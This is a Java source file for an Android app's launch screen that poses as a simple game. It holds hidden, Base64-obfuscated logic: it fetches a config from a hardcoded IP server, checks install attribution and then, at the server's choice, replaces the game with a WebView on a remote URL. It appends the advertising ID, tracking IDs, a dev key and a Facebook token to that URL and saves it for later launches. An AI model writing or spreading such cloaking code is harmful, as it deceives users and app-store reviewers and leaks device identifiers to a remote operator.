package com.awiatori;

import static com.awiatori.ApplicationF.jcsgaj;
import static com.awiatori.ApplicationF.bbfkd;
import static com.awiatori.Fbin.deep;
import static com.awiatori.Fbin.strDeepLink;
import static com.awiatori.WebActivity.urlstatus;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class PT extends AppCompatActivity {

    public static String savUrl;
    public static String status;
    public static String url;
    public static String fbToken;
    public static String fbId;
    public static String load;
    @SuppressLint("StaticFieldLeak")
    private static ProgressBar progressBar;
    @SuppressLint("StaticFieldLeak")
    private static Button bSss, bGpp, bCccc;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.pt);
        getWindow().addFlags(1024);
        Parser.pt = this;
        Fbin.pt = this;
        progressBar = findViewById(R.id.progressBar);
        bSss = findViewById(R.id.bSss);
        bGpp = findViewById(R.id.bGpp);
        bCccc = findViewById(R.id.bCccc);

        savUrl = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(dec("c2F2ZWRVcmw="), dec("bnVsbA=="));

        if (!urlstatus) {

            if (savUrl.equals(dec("bnVsbA=="))) {
                connect();

            } else {

                if (!isOnline()) {
                    startGame(this);
                } else {
                    load = savUrl;
                    startActivity(new Intent(getApplicationContext(), WebActivity.class));
                    finishAffinity();

                }
            }
        } else {
            startGame(this);
        }

    }

    protected boolean isOnline() {
        String cs = Context.CONNECTIVITY_SERVICE;
        ConnectivityManager cm = (ConnectivityManager) getSystemService(cs);
        if (cm.getActiveNetworkInfo() == null) {
            return false;
        } else {
            return true;
        }
    }

    private static void startGame(PT pt) {
        progressBar.setVisibility(View.INVISIBLE);
        bSss.setVisibility(View.VISIBLE);
        bGpp.setVisibility(View.VISIBLE);
        bCccc.setVisibility(View.VISIBLE);

        bSss.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                pt.startActivity(new Intent(pt.getApplicationContext(), MainActivity.class));
            }
        });

        bGpp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                pt.startActivity(new Intent(pt.getApplicationContext(), PrivAc.class));
            }
        });

        bCccc.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                pt.finishAffinity();
            }
        });


    }

    public void connect() {

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {

                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(dec("aHR0cDovLzg4Ljg1LjY0LjEzMy9waXJhdGVzdHJlYXN1cmUuanNvbg==")).openConnection();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                    status = bufferedReader.readLine();
                    url = bufferedReader.readLine();
                    fbToken = bufferedReader.readLine();
                    fbId = bufferedReader.readLine();


                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            Fbin.fbin(fbId);
                            AppEventsLogger.activateApp(getApplication());
                            AppLinkData.fetchDeferredAppLinkData(getApplicationContext(), new AppLinkData.CompletionHandler() {
                                @Override
                                public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkData) {
                                    if (appLinkData == null) {
                                        appLinkData = AppLinkData.createFromActivity(PT.this);

                                    }
                                    if (appLinkData != null) {

                                        String[] as = appLinkData.getTargetUri().toString().split("://");
                                        deep = as[1];
                                        strDeepLink = Parser.parse(deep);

                                    } else {

                                    }
                                }
                            });

                            new CountDownTimer(20000, 1000) {

                                @Override
                                public void onTick(long l) {
                                    if (!ApplicationF.ihhds.equals("-") || !strDeepLink.equals("-")) {
                                        cancel();
                                        startWe(url, status);
                                    } else {

                                    }
                                }

                                @Override
                                public void onFinish() {
                                    startWe(url, status);
                                }
                            }.start();

                        }
                    });

                } catch (Exception e) {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            noInternet();
                        }
                    });

                }
            }
        }).start();

    }

    public void noInternet() {
        new AlertDialog.Builder(this)
                .setTitle(dec("Q2hlY2sgdGhlIGludGVybmV0IGNvbm5lY3Rpb24gcGxlYXNlIQ=="))
                .setNeutralButton(dec("b2s="), new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        startActivity(new Intent(getApplication(), PT.class));
                        finishAffinity();
                    }
                }).show();
    }

    public void startWe(String link, String status) {

        if (ApplicationF.ihhds.equals(dec("Tm9uLW9yZ2FuaWM="))) {
            load = link + bbfkd;
            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(dec("c2F2ZWRVcmw="), load).apply();

            startActivity(new Intent(getApplicationContext(), WebActivity.class));
            finishAffinity();
        } else if (deep != null) {
            load = link + strDeepLink;

            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(dec("c2F2ZWRVcmw="), load).apply();
            startActivity(new Intent(getApplicationContext(), WebActivity.class));
            finishAffinity();

        } else {
            if (status.equals("0")) {

                startGame(this);
            } else {

                load = link + dec("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
                        dec("Jmdvb2dsZV9hZGlkPQ==") + ApplicationF.nnhda +
                        dec("JmFmX3VzZXJpZD0=") + ApplicationF.UCSHS +
                        dec("JmRldl9rZXk9") + dec(jcsgaj) +
                        dec("JmJ1bmRsZT0=") + getPackageName() +
                        dec("JmZiX2FwcF9pZD0=") + fbId +
                        dec("JmZiX2F0PQ==") + fbToken;

                getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(dec("c2F2ZWRVcmw="), load).apply();
                startActivity(new Intent(getApplicationContext(), WebActivity.class));
                finishAffinity();
            }
        }
    }

    public static String dec(String str) {

        byte[] decoded = android.util.Base64.decode(str, Base64.DEFAULT);
        return new String(decoded);
    }
}
